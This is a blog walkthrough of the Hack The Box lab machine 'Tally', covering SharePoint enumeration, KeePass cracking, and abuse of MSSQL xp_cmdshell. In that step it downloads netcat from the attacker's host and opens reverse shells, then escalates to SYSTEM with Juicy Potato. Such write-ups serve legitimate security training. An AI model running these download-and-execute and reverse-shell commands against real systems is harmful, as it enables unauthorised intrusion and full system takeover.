---
layout: post
title: "Tally"
categories: HTB-Walkthrough
---

![tally1](/assets/img/tally/tally1.png)



<h3>Nmap</h3>


```
nmap -sV -Pn 10.10.10.59 -p- --min-rate 10000 |tee -a tally.txt
```

```
Nmap scan report for 10.10.10.59
Host is up (0.94s latency).
Not shown: 37867 filtered ports, 27655 closed ports
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
81/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2016 13.00.1601
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
15567/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
32843/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49665/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```


<hr width="300" size="10">


To get more information on the services I ran a more agressive nmap scan.

```
nmap -A 10.10.10.59 |tee -a tally.txt
```

```
Nmap done: 1 IP address (1 host up) scanned in 152.86 seconds
root@kali:~/HTB/retired/tally# nmap -A 10.10.10.59 -p- |tee -a tally.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 17:31 EDT
Nmap scan report for 10.10.10.59
Host is up (0.11s latency).
Not shown: 65514 closed ports
PORT      STATE SERVICE              VERSION
21/tcp    open  ftp                  Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http                 Microsoft IIS httpd 10.0
|_http-generator: Microsoft SharePoint
|_http-server-header: Microsoft-IIS/10.0
| http-title: Home
|_Requested resource was http://10.10.10.59/_layouts/15/start.aspx#/default.aspx
81/tcp    open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
135/tcp   open  msrpc                Microsoft Windows RPC
139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds         Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
808/tcp   open  ccproxy-http?
1433/tcp  open  ms-sql-s             Microsoft SQL Server 2016 13.00.1601.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: TALLY
|   NetBIOS_Domain_Name: TALLY
|   NetBIOS_Computer_Name: TALLY
|   DNS_Domain_Name: TALLY
|   DNS_Computer_Name: TALLY
|_  Product_Version: 10.0.14393
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2020-04-07T21:00:31
|_Not valid after:  2050-04-07T21:00:31
|_ssl-date: 2020-04-07T22:28:50+00:00; +2m35s from scanner time.
5985/tcp  open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
15567/tcp open  http                 Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|   Negotiate
|_  NTLM
| http-ntlm-info: 
|   Target_Name: TALLY
|   NetBIOS_Domain_Name: TALLY
|   NetBIOS_Computer_Name: TALLY
|   DNS_Domain_Name: TALLY
|   DNS_Computer_Name: TALLY
|_  Product_Version: 10.0.14393
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
32843/tcp open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
32844/tcp open  ssl/http             Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
| ssl-cert: Subject: commonName=SharePoint Services/organizationName=Microsoft/countryName=US
| Subject Alternative Name: DNS:localhost, DNS:tally
| Not valid before: 2017-09-17T22:51:16
|_Not valid after:  9999-01-01T00:00:00
|_ssl-date: 2020-04-07T22:28:49+00:00; +2m35s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
32846/tcp open  msexchange-logcopier Microsoft Exchange 2010 log copier
47001/tcp open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc                Microsoft Windows RPC
49665/tcp open  msrpc                Microsoft Windows RPC
49666/tcp open  msrpc                Microsoft Windows RPC
49667/tcp open  msrpc                Microsoft Windows RPC
49668/tcp open  msrpc                Microsoft Windows RPC
49669/tcp open  msrpc                Microsoft Windows RPC
49670/tcp open  msrpc                Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=4/7%OT=21%CT=1%CU=41338%PV=Y%DS=2%DC=T%G=Y%TM=5E8CFE0A
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=I%CI=RD%TS=A)SEQ(SP=1
OS:06%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=106%GCD=1%ISR=10B%TI=RD
OS:%II=I%TS=A)OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8S
OS:T11%O5=M54DNW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=20
OS:00%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=8
OS:0%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(
OS:R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
OS:=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%
OS:T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE
OS:(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2m34s, deviation: 0s, median: 2m34s
| ms-sql-info: 
|   10.10.10.59:1433: 
|     Version: 
|       name: Microsoft SQL Server 2016 RTM
|       number: 13.00.1601.00
|       Product: Microsoft SQL Server 2016
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-07T22:28:30
|_  start_date: 2020-04-07T20:59:45

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   92.88 ms  10.10.14.1
2   192.02 ms 10.10.10.59

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3280.35 seconds
```



<hr width="300" size="10">

Ftp doesn't allow anonymous login so we move on the the web server.




<hr width="300" size="10">


<h3>Gobuster</h3>

I find a relevant wordlist in SecLists.

```
gobuster dir -u http://10.10.10.59/ -w /root/wordlists/SecLists/Discovery/Web-Content/CMS/sharepoint.txt 
```


<hr width="300" size="10">

<h3>Web</h3>


Working through the list of Gobuster results, we can view an interesting page:
```
http://10.10.10.59/docs/_layouts/viewlsts.aspx
```

![viewlists](/assets/img/tally/tally-viewlists.png)

There is a 'document' and a 'site page' to check:

![doc](/assets/img/tally/tally-docs-ftp.png)

Viewing the downloaded `ftp-details.docx`, we find ftp password but no username.

clicking the 'site pages' link starts taking us to 

```
http://10.10.10.59/SitePages/Forms/AllPages.aspx
```

but then redirects to:

```
http://10.10.10.59/_layouts/15/start.aspx#/SitePages/Forms/AllPages.aspx
```

Which is empty...amending the url takes us to the desired page.

![site-pages](/assets/img/tally/tally-site-pages.png)


We are able to view the 'Finance Team' page without redirection.

![finance-team](/assets/img/tally/tally-finance-team.png)


It gives us our 'ftp_user' username.


<hr width="300" size="10">

<h3>FTP</h3>


username: `ftp_user`
password: `UTDRSCH53c"$6hys`


we can login successfully with these creds:
![ftp-login](/assets/img/tally/tally-ftp-login.png)


```
ftp> cd user
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
09-13-17  08:59PM       <DIR>          Administrator
09-15-17  08:59PM       <DIR>          Ekta
09-11-17  10:20PM       <DIR>          Jess
09-15-17  08:59PM       <DIR>          Paul
09-15-17  08:56PM       <DIR>          Rahul
09-21-17  12:38AM       <DIR>          Sarah
09-17-17  09:43PM       <DIR>          Stuart
09-15-17  08:57PM       <DIR>          Tim
09-15-17  08:58PM       <DIR>          Yenwi
226 Transfer complete.
ftp> 

```

Tim's folder has a 'keepass' archive.

```
ftp> cd tim
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
09-17-17  09:39PM       <DIR>          Files
09-02-17  08:08AM       <DIR>          Project
226 Transfer complete.
ftp> cd files
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
09-15-17  08:58PM                   17 bonus.txt
09-15-17  09:24PM       <DIR>          KeePass-2.36
09-15-17  09:22PM                 2222 tim.kdbx
226 Transfer complete.
ftp> bin
200 Type set to I.
ftp> get tim.kdbx
local: tim.kdbx remote: tim.kdbx
200 PORT command successful.
150 Opening BINARY mode data connection.
226 Transfer complete.
2222 bytes received in 0.95 secs (2.2935 kB/s)
```

Switching to `binary mode` with the `bin` command ensures accurate file transfers. 


<hr width="300" size="10">




<h3>Keepass2john</h3>

```
keepass2john tim.kdbx >hash.txt
```

```
john --format="keepass" --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

john finds the password quickly.

```
simplementeyo    (tim)
```


<hr width="300" size="10">


<h3>kpcli</h3>



```
kpcli --kdb=tim.kdbx

Please provide the master password: *************************                                         
                                                                                                      
KeePass CLI (kpcli) v3.1 is ready for operation.                                                      
Type 'help' for a description of available commands.                                                  
Type 'help <command>' for details on individual commands.                                             
                                                                                                      
kpcli:/> ls                                                                                           
=== Groups ===                                                                                        
PERSONAL/                                                                                             
WORK/                                                                                                 
kpcli:/> cd WORK
kpcli:/WORK> ls                                                                                       
=== Groups ===                                                                                        
CISCO/                                                                                                
CLOUD/                                                                                                
EMAIL/                                                                                                
SOFTWARE/                                                                                             
VENDORS/
WINDOWS/
kpcli:/WORK> cd WINDOWS
kpcli:/WORK/WINDOWS> ls
=== Groups ===
Desktops/
Servers/
Shares/
kpcli:/WORK/WINDOWS> cd Shares
kpcli:/WORK/WINDOWS/Shares> ls
=== Entries ===
0. TALLY ACCT share                                                       
kpcli:/WORK/WINDOWS/Shares> show 0

Title: TALLY ACCT share
Uname: Finance
 Pass: Acc0unting
  URL: 
Notes: 
```

We can probably login to the smbserver with these creds:
`Finance / Acc0unting`


<hr width="300" size="10">



<h3>Smbclient</h3>

```
smbclient -U Finance //10.10.10.59/ACCT

Enter WORKGROUP\Finance's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Sep 18 01:58:18 2017
  ..                                  D        0  Mon Sep 18 01:58:18 2017
  Customers                           D        0  Sun Sep 17 16:28:40 2017
  Fees                                D        0  Mon Aug 28 17:20:52 2017
  Invoices                            D        0  Mon Aug 28 17:18:19 2017
  Jess                                D        0  Sun Sep 17 16:41:29 2017
  Payroll                             D        0  Mon Aug 28 17:13:32 2017
  Reports                             D        0  Fri Sep  1 16:50:11 2017
  Tax                                 D        0  Sun Sep 17 16:45:47 2017
  Transactions                        D        0  Wed Sep 13 15:57:44 2017
  zz_Archived                         D        0  Fri Sep 15 16:29:35 2017
  zz_Migration                        D        0  Sun Sep 17 16:49:13 2017

                8387839 blocks of size 4096. 607797 blocks available
smb: \> 
```


<hr width="300" size="10">



```
smb: \zz_Migration\binaries\> cd "New folder"
smb: \zz_Migration\binaries\New folder\> ls
  .                                   D        0  Thu Sep 21 02:21:09 2017
  ..                                  D        0  Thu Sep 21 02:21:09 2017
  crystal_reports_viewer_2016_sp04_51051980.zip      A 389188014  Wed Sep 13 15:56:38 2017
  Macabacus2016.exe                   A 18159024  Mon Sep 11 17:20:05 2017
  Orchard.Web.1.7.3.zip               A 21906356  Tue Aug 29 19:27:42 2017
  putty.exe                           A   774200  Sun Sep 17 16:19:26 2017
  RpprtSetup.exe                      A   483824  Fri Sep 15 15:49:46 2017
  tableau-desktop-32bit-10-3-2.exe      A 254599112  Mon Sep 11 17:13:14 2017
  tester.exe                          A   215552  Fri Sep  1 07:15:54 2017
  vcredist_x64.exe                    A  7194312  Wed Sep 13 16:06:28 2017

                8387839 blocks of size 4096. 611072 blocks available
smb: \zz_Migration\binaries\New folder\> get tester.exe
getting file \zz_Migration\binaries\New folder\tester.exe of size 215552 as tester.exe (136.3 KiloBytes/sec) (average 136.3 KiloBytes/sec)
```


`strings tester.exe`

![strings](/assets/img/tally/tally-strings.png)


`sa / GWE3V65#6KFH93@4GWTG2G`


Now we can connect to the database


<hr width="300" size="10">


<h3>sqsh</h3>

```
sqsh -S 10.10.10.59 -U sa
```

```
EXEC SP_CONFIGURE N'show advanced options', 1

go

EXEC SP_CONFIGURE N'xp_cmdshehll', 1
go

RECONFIGURE
go


xp_cmdshell 'dir C:\';
go

xp_cmdshell 'mkdir c:\boo';

xp_cmdshell 'powershell Invoke-WebRequest -uri http://10.10.14.17/nc.exe -outfile c:\boo\nc.exe';
go

xp_cmdshell 'c:\boo\nc.exe 10.10.14.17 6969 -e cmd';
go
```
use a python3 webserver to serve nc.exe
```
python3 -m http.server 80
```


we catch the shell on `nc -nlvp 6969`

![gotshell](/assets/img/tally/tally-gotshell-sarah.png)




```
c:\Users\Sarah\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8EB3-6DCB

 Directory of c:\Users\Sarah\Desktop

07/04/2020  22:01    <DIR>          .
07/04/2020  22:01    <DIR>          ..
01/10/2017  22:32               916 browser.bat
17/09/2017  21:50               845 FTP.lnk
23/09/2017  21:11               297 note to tim (draft).txt
19/10/2017  21:49            17,152 SPBestWarmUp.ps1
19/10/2017  22:48            11,010 SPBestWarmUp.xml
17/09/2017  21:48             1,914 SQLCMD.lnk
21/09/2017  00:46               129 todo.txt
31/08/2017  02:04                32 user.txt
17/09/2017  21:49               936 zz_Migration.lnk
               9 File(s)         33,231 bytes
               2 Dir(s)   2,482,917,376 bytes free

c:\Users\Sarah\Desktop>type user.txt
type user.txt
be7xxxxxxxxxxxxxxxxxxxxxxxxxxbb1
```


<hr width="300" size="10">



<h3>Privilege Escalation</h3>



Crank up the python3 webserver again, this time to serve Juicy Potato:
```
python3 -m http.server 80
```

```
c:\boo>systeminfo
systeminfo

Host Name:                 TALLY
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00376-30726-67778-AA877
Original Install Date:     28/08/2017, 15:43:34
System Boot Time:          07/04/2020, 21:59:16
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-gb;English (United Kingdom)
Input Locale:              en-gb;English (United Kingdom)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,047 MB
Available Physical Memory: 192 MB
Virtual Memory: Max Size:  4,376 MB
Virtual Memory: Available: 669 MB
Virtual Memory: In Use:    3,707 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB.LOCAL
Logon Server:              \\TALLY
Hotfix(s):                 2 Hotfix(s) Installed.
                           [01]: KB3199986
                           [02]: KB4015217
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.59
                                 [02]: fe80::216c:6707:f767:48d2
                                 [03]: dead:beef::216c:6707:f767:48d2
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```


<hr width="300" size="10">


Write shell.bat and copy it with 'iwr' to target:
```
c:\boo>type shell.bat
type shell.bat
c:\boo\nc.exe 10.10.14.17 6868 -e cmd
```

set a netcat listenter running on Kali
```
nc -nlvp 6868
```

Now run the Juicy-Potato exploit.
```
c:\boo>.\jp.exe -l 9001 -t * -p c:\boo\shell.bat -c "{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}"
.\jp.exe -l 9001 -t * -p c:\boo\shell.bat -c "{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}"
Testing {7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381} 9001
......
[+] authresult 0
{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

and catch the System privileged shell:

![system-shell](/assets/img/tally/tally-system-shell.png)

Grab that flag!

```
c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8EB3-6DCB

 Directory of c:\Users\Administrator\Desktop

10/19/2017  10:45 PM    <DIR>          .
10/19/2017  10:45 PM    <DIR>          ..
08/31/2017  02:03 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   2,498,945,024 bytes free

c:\Users\Administrator\Desktop>type root.txt
type root.txt
608xxxxxxxxxxxxxxxxxxxxxxxxxxeda
c:\Users\Administrator\Desktop>
```
<hr width="300" size="10">


<h4>Post-script</h4>

Lots of time spent on this chasing red-herrings down rabbit holes!
Fun box!




:)
